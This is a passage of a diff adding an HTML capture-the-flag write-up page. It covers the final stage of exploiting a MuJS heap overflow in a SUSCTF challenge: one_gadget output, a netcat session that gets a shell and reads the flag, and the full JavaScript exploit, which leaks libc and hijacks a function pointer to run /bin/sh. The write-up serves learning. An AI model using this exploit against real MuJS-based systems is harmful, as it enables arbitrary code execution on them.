+</span><span>		</span><span style="color:#fdf4c1;">jsR_pushtrace(J, obj-&gt;u.c.name, </span><span style="color:#b8bb26;">&quot;native&quot;</span><span style="color:#fdf4c1;">, </span><span style="color:#d3869b;">0</span><span style="color:#fdf4c1;">)</span><span>;
+</span><span>		</span><span style="color:#fdf4c1;">jsR_callcfunction(J, n, obj-&gt;u.c.length, obj-&gt;u.c.function)</span><span>;
+</span><span>		</span><span style="color:#fe8019;">--</span><span>J-&gt;tracetop;
+</span><span>	}
+</span><span style="font-style:italic;color:#928374;">// ...
+</span><span style="background-color:#932b1e;color:#fdf4c1;">}</span><span>
+</span></code></pre>
+<p>As for the target to jump to we use amazing <a href="https://github.com/david942j/one_gadget">one_gadget</a>. It gives us code execution using a single jump to a specific libc address.</p>
+<pre data-lang="bash" style="background-color:#282828;color:#fdf4c1aa;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#fdf4c1;">$ one_gadget libc.so.6
+</span><span style="color:#fdf4c1;">0xe6c7e execve(</span><span style="color:#b8bb26;">&quot;/bin/sh&quot;</span><span style="color:#fdf4c1;">, r15, r12</span><span>)
+</span><span style="color:#fdf4c1;">constraints:
+</span><span>  </span><span style="color:#fdf4c1;">[r15] == NULL </span><span style="color:#fe8019;">|| </span><span style="color:#fdf4c1;">r15 == NULL
+</span><span>  </span><span style="color:#fdf4c1;">[r12] == NULL </span><span style="color:#fe8019;">|| </span><span style="color:#fdf4c1;">r12 == NULL
+</span><span>
+</span><span style="color:#fdf4c1;">0xe6c81 execve(</span><span style="color:#b8bb26;">&quot;/bin/sh&quot;</span><span style="color:#fdf4c1;">, r15, rdx</span><span>)
+</span><span style="color:#fdf4c1;">constraints:
+</span><span>  </span><span style="color:#fdf4c1;">[r15] == NULL </span><span style="color:#fe8019;">|| </span><span style="color:#fdf4c1;">r15 == NULL
+</span><span>  </span><span style="color:#fdf4c1;">[rdx] == NULL </span><span style="color:#fe8019;">|| </span><span style="color:#fdf4c1;">rdx == NULL
+</span><span>
+</span><span style="color:#fdf4c1;">0xe6c84 execve(</span><span style="color:#b8bb26;">&quot;/bin/sh&quot;</span><span style="color:#fdf4c1;">, rsi, rdx</span><span>)
+</span><span style="color:#fdf4c1;">constraints:
+</span><span>  </span><span style="color:#fdf4c1;">[rsi] == NULL </span><span style="color:#fe8019;">|| </span><span style="color:#fdf4c1;">rsi == NULL
+</span><span>  </span><span style="color:#fdf4c1;">[rdx] == NULL </span><span style="color:#fe8019;">|| </span><span style="color:#fdf4c1;">rdx == NULL
+</span></code></pre>
+<p>And third gadget got worked!</p>
+<pre data-lang="bash" style="background-color:#282828;color:#fdf4c1aa;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#fdf4c1;">$ nc 124.71.182.21 9999
+</span><span style="color:#fdf4c1;">./tmp/18759.js
+</span><span style="color:#fdf4c1;">Please give your exp.js here, end with </span><span style="color:#b8bb26;">&#39;&lt; EOF &gt;&#39;</span><span style="color:#fdf4c1;">:
+</span><span style="color:#fdf4c1;">.... exploit here
+</span><span style="color:#fe8019;">&lt;</span><span> EOF </span><span style="color:#fe8019;">&gt;
+</span><span style="color:#fdf4c1;">last_size: 0
+</span><span style="color:#fdf4c1;">./mujs ./tmp/18759.js
+</span><span style="color:#fdf4c1;">ls
+</span><span style="color:#fdf4c1;">bin
+</span><span style="color:#fdf4c1;">dev
+</span><span style="color:#fdf4c1;">flag
+</span><span style="color:#fdf4c1;">io
+</span><span style="color:#fdf4c1;">lib
+</span><span style="color:#fdf4c1;">lib32
+</span><span style="color:#fdf4c1;">lib64
+</span><span style="color:#fdf4c1;">libx32
+</span><span style="color:#fdf4c1;">mujs
+</span><span style="color:#fdf4c1;">tmp
+</span><span style="color:#fdf4c1;">cat flag
+</span><span style="color:#fdf4c1;">SUSCTF{***********************</span><span>}
+</span></code></pre>
+<h3 id="final-exploit">Final exploit</h3>
+<pre data-lang="js" style="background-color:#282828;color:#fdf4c1aa;" class="language-js "><code class="language-js" data-lang="js"><span style="color:#fdf4c1;">b </span><span style="color:#fe8019;">= </span><span style="color:#8ec07c;">DataView</span><span>(</span><span style="color:#d3869b;">0x68</span><span>);
+</span><span style="color:#fdf4c1;">a </span><span style="color:#fe8019;">= </span><span style="color:#8ec07c;">DataView</span><span>(</span><span style="color:#d3869b;">0x48</span><span>);
+</span><span style="color:#fdf4c1;">b </span><span style="color:#fe8019;">= </span><span style="color:#8ec07c;">DataView</span><span>(</span><span style="color:#d3869b;">0x48</span><span>);
+</span><span style="color:#fdf4c1;">c </span><span style="color:#fe8019;">= </span><span style="color:#8ec07c;">DataView</span><span>(</span><span style="color:#d3869b;">0x48</span><span>);
+</span><span style="color:#fdf4c1;">e </span><span style="color:#fe8019;">= </span><span style="color:#8ec07c;">DataView</span><span>(</span><span style="color:#d3869b;">0x48</span><span>);
+</span><span style="color:#fdf4c1;">f </span><span style="color:#fe8019;">= </span><span style="color:#8ec07c;">DataView</span><span>(</span><span style="color:#d3869b;">0x1000 </span><span style="color:#fe8019;">* </span><span style="color:#d3869b;">0x1000</span><span>);
+</span><span>
+</span><span style="color:#fdf4c1;">b.</span><span style="color:#8ec07c;">setUint8</span><span>(</span><span style="color:#d3869b;">0x48</span><span style="color:#fe8019;">+</span><span style="color:#d3869b;">8</span><span>, </span><span style="color:#d3869b;">10</span><span>); </span><span style="font-style:italic;color:#928374;">// set c type to Date
+</span><span style="color:#8ec07c;">Date</span><span style="color:#fdf4c1;">.</span><span style="color:#fabd2f;">prototype</span><span style="color:#fdf4c1;">.setTime.</span><span style="color:#8ec07c;">bind</span><span>(</span><span style="color:#fdf4c1;">c</span><span>)(</span><span style="color:#d3869b;">1.09522e+12</span><span>) </span><span style="font-style:italic;color:#928374;">// write random big number to u.number/u.length
+</span><span style="color:#fdf4c1;">b.</span><span style="color:#8ec07c;">setUint8</span><span>(</span><span style="color:#d3869b;">0x48</span><span style="color:#fe8019;">+</span><span style="color:#d3869b;">8</span><span>, </span><span style="color:#d3869b;">16</span><span>); </span><span style="font-style:italic;color:#928374;">// set c type back to DataView
+</span><span>
+</span><span>
+</span><span style="color:#fdf4c1;">sh32 </span><span style="color:#fe8019;">= </span><span style="color:#d3869b;">4294967296 </span><span style="font-style:italic;color:#928374;">// 1&lt;&lt;32
+</span><span style="color:#fdf4c1;">libb_addr_off </span><span style="color:#fe8019;">= </span><span style="color:#d3869b;">472
+</span><span style="color:#fdf4c1;">libc_leak </span><span style="color:#fe8019;">= </span><span style="color:#fdf4c1;">c.</span><span style="color:#8ec07c;">getUint32</span><span>(</span><span style="color:#fdf4c1;">libb_addr_off</span><span>) </span><span style="color:#fe8019;">+ </span><span>(</span><span style="color:#fdf4c1;">c.</span><span style="color:#8ec07c;">getUint32</span><span>(</span><span style="color:#fdf4c1;">libb_addr_off</span><span style="color:#fe8019;">+</span><span style="color:#d3869b;">4</span><span>)</span><span style="color:#fe8019;">*</span><span style="color:#fdf4c1;">sh32</span><span>)
+</span><span>
+</span><span style="color:#fdf4c1;">libc_off </span><span style="color:#fe8019;">= </span><span style="color:#d3869b;">0x7ffff7c31000 </span><span style="color:#fe8019;">- </span><span style="color:#d3869b;">0x7ffff6bfe010 </span><span style="font-style:italic;color:#928374;">// got this from gdb
+</span><span style="color:#fdf4c1;">libc_base </span><span style="color:#fe8019;">= </span><span style="color:#fdf4c1;">libc_leak </span><span style="color:#fe8019;">+ </span><span style="color:#fdf4c1;">libc_off
+</span><span style="color:#8ec07c;">print</span><span>(</span><span style="color:#b8bb26;">&#39;libc base:&#39;</span><span>, </span><span style="color:#fdf4c1;">libc_base.</span><span style="color:#fabd2f;">toString</span><span>(</span><span style="color:#d3869b;">16</span><span>))
+</span><span>
+</span><span style="color:#fdf4c1;">one_gag </span><span style="color:#fe8019;">= </span><span style="color:#fdf4c1;">libc_base </span><span style="color:#fe8019;">+ </span><span style="color:#d3869b;">0xe6c84
+</span><span style="color:#8ec07c;">print</span><span>(</span><span style="color:#b8bb26;">&#39;onegadget:&#39;</span><span>, </span><span style="color:#fdf4c1;">one_gag.</span><span style="color:#fabd2f;">toString</span><span>(</span><span style="color:#d3869b;">16</span><span>))
+</span><span>
+</span><span style="color:#fdf4c1;">e_obj_off </span><span style="color:#fe8019;">= </span><span style="color:#d3869b;">192
+</span><span style="color:#fdf4c1;">c.</span><span style="color:#8ec07c;">setUint8</span><span>(</span><span style="color:#d3869b;">160</span><span>, </span><span style="color:#d3869b;">4</span><span>) </span><span style="font-style:italic;color:#928374;">// this sets type to JS_CCFUNCTION
+</span><span>
+</span><span style="font-style:italic;color:#928374;">// set lower 4 bytes of js_CFunction function
+</span><span style="color:#fdf4c1;">c.</span><span style="color:#8ec07c;">setUint32</span><span>(</span><span style="color:#fdf4c1;">e_obj_off</span><span style="color:#fe8019;">+</span><span style="color:#d3869b;">8</span><span>, </span><span style="color:#fdf4c1;">one_gag</span><span style="color:#fe8019;">&amp;</span><span style="color:#d3869b;">0xffffffff</span><span>) 
+</span><span>
+</span><span style="font-style:italic;color:#928374;">// set upper 4 bytes of js_CFunction function
+</span><span style="color:#fdf4c1;">c.</span><span style="color:#8ec07c;">setUint32</span><span>(</span><span style="color:#fdf4c1;">e_obj_off</span><span style="color:#fe8019;">+</span><span style="color:#d3869b;">8</span><span style="color:#fe8019;">+</span><span style="color:#d3869b;">4</span><span>, </span><span style="color:#fabd2f;">Math</span><span style="color:#fdf4c1;">.</span><span style="color:#fabd2f;">floor</span><span>(</span><span style="color:#fdf4c1;">one_gag</span><span style="color:#fe8019;">/</span><span style="color:#fdf4c1;">sh32</span><span>)</span><span style="color:#fe8019;">&amp;</span><span style="color:#d3869b;">0xffffffff</span><span>) 
+</span><span style="color:#8ec07c;">e</span><span>() </span><span style="font-style:italic;color:#928374;">// e is now a function so we can call it 
+</span></code></pre>
+<p>I'm speaking with no experience here but this is basic idea of how heap overflow bugs are exploited in big projects like <a href="https://v8.dev/">V8</a> but there's much more stuff going on there so it's way harder to get determinism.</p>
+<p>Thanks for the reading till the end! </p>
+<p>Let's hope I'll write more writeups.</p>
+<p>Glory to Ukraine!</p>
+
+        </div>
+    </article>
+</main>
+
+        </main>
+
+        <footer>
+            <div class="footer-content">
+            <div class="footer-content-left">
+                
+            </div>
+            <div class="footer-content-right">
+                
+                <a href="https:&#x2F;&#x2F;twitter.com&#x2F;skkhokho">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1000 1000" width="20">
+                        <path fill="#1e1e1e" d="M0 781.864q0 7.32 7.32 13.176 12.2 8.296 43.432 24.4 119.072 61.488 249.856 61.488 162.992 0 296.216 -83.936 63.44 -40.016 112.728 -96.38t78.324 -117.608 43.432 -122.732 13.42 -119.56v-17.08q57.096 -40.992 89.304 -93.696 2.928 -5.856 2.928 -8.784 0 -6.344 -4.88 -11.224t-11.224 -4.88q-3.416 0 -11.712 3.904 -5.856 1.952 -14.396 4.88t-14.64 5.124 -8.052 2.684q12.688 -14.152 26.352 -38.308t13.664 -35.38q0 -6.344 -4.88 -10.98t-11.712 -4.636q-3.904 0 -7.808 2.44 -55.632 29.768 -103.944 40.504 -59.048 -56.12 -141.032 -56.12 -83.936 0 -142.984 58.56t-59.048 141.52q0 14.64 1.952 23.912 -82.472 -6.832 -159.088 -39.528t-137.616 -87.84q-14.152 -13.664 -54.656 -57.096 -5.856 -5.856 -13.664 -5.856 -5.856 0 -12.2 7.808 -12.688 19.032 -20.008 46.604t-7.32 53.924q0 72.712 45.384 126.88l-14.152 -6.832q-12.2 -5.368 -18.056 -5.368 -8.296 0 -13.908 4.88t-5.612 12.688q0 51.24 26.352 97.112t71.248 73.2l-5.856 -.976q-.976 0 -2.684 -.488t-2.684 -.732 -1.464 -.244q-6.344 0 -10.98 4.88t-4.636 10.736q0 .488 .976 5.368 16.592 50.752 55.144 86.132t90.28 47.58q-84.912 52.216 -187.392 52.216 -6.832 0 -21.96 -1.464 -20.496 -.976 -22.448 -.976 -6.344 0 -10.98 4.88t-4.636 11.224z"/>
+                    </svg>
+                </a>
+                
+                
+                <a href="https:&#x2F;&#x2F;github.com&#x2F;khokho">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024" width="20">
+                        <path fill="#1e1e1e" d="M512 0C229.25 0 0 229.25 0 512c0 226.25 146.688 418.125 350.156 485.812 25.594 4.688 34.938-11.125 34.938-24.625 0-12.188-.469-52.562-.719-95.312C242 908.812 211.906 817.5 211.906 817.5c-23.312-59.125-56.844-74.875-56.844-74.875-46.531-31.75 3.53-31.125 3.53-31.125 51.406 3.562 78.47 52.75 78.47 52.75 45.688 78.25 119.875 55.625 149 42.5 4.654-33 17.904-55.625 32.5-68.375-113.656-12.937-233.218-56.875-233.218-253.063 0-55.938 19.969-101.562 52.656-137.406-5.219-13-22.844-65.094 5.062-135.562 0 0 42.938-13.75 140.812 52.5 40.812-11.406 84.594-17.031 128.125-17.219 43.5.188 87.312 5.875 128.188 17.281 97.688-66.312 140.688-52.5 140.688-52.5 28 70.531 10.375 122.562 5.125 135.5 32.812 35.844 52.625 81.469 52.625 137.406 0 196.688-119.75 240-233.812 252.688 18.438 15.875 34.75 47 34.75 94.75 0 68.438-.688 123.625-.688 140.5 0 13.625 9.312 29.562 35.25 24.562C877.438 930 1024 738.125 1024 512 1024 229.25 794.75 0 512 0z"/>
+                    </svg>
+                </a>
+                
+            </div>
+            </div>
+        </footer>
+    </body>
+</html>
